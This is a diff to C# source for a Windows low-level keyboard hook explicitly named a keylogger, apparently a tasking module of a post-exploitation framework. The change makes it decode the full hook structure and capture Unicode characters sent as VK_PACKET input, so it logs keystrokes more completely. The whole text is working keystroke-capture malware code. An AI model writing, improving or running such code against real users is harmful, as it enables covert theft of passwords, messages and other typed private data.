@@ -849,8 +849,8 @@
                     }
                     if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                     {
-                        int vkCode = Marshal.ReadInt32(lParam);
-                        
+                        KbDllHookStruct kbHookStruct = (KbDllHookStruct) Marshal.PtrToStructure(lParam, typeof(KbDllHookStruct));
+                        int vkCode = kbHookStruct.VirtualKeyCode;
                         bool shifted = GetKeyState(160) < 0 || GetKeyState(161) < 0;
                         Keys keycode = (Keys)vkCode;
                         if (!(shifted && KeyDictShift.TryGetValue(keycode, out string append)) &&  !KeyDict.TryGetValue(keycode, out append))
@@ -865,12 +865,16 @@
                                 append = keycode.ToString().ToUpper();
                             }
                         }
+                        if (vkCode == 231)
+                        {
+                          append = ((char)kbHookStruct.ScanCode).ToString();
+                        }
                         Console.Write(append);
                     }
                     Console.Out.Flush();
                 }
                 catch (Exception e) {
-                  Console.Error.WriteLine("Keylogger HookProc exception - " + e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                  Console.Error.WriteLine("Keylogger Exception - " + e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
                 }
                 return CallNextHookEx(HookID, nCode, wParam, lParam);
             };
@@ -1243,6 +1247,20 @@
             Shift = 65536,
             Control = 131072,
             Alt = 262144
+        }
+      
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct KbDllHookStruct
+        {
+            public int VirtualKeyCode;
+
+            public int ScanCode;
+
+            public int Flags;
+
+            public int Time;
+
+            public int ExtraInfo;
         }
     }
   TaskingType: Assembly
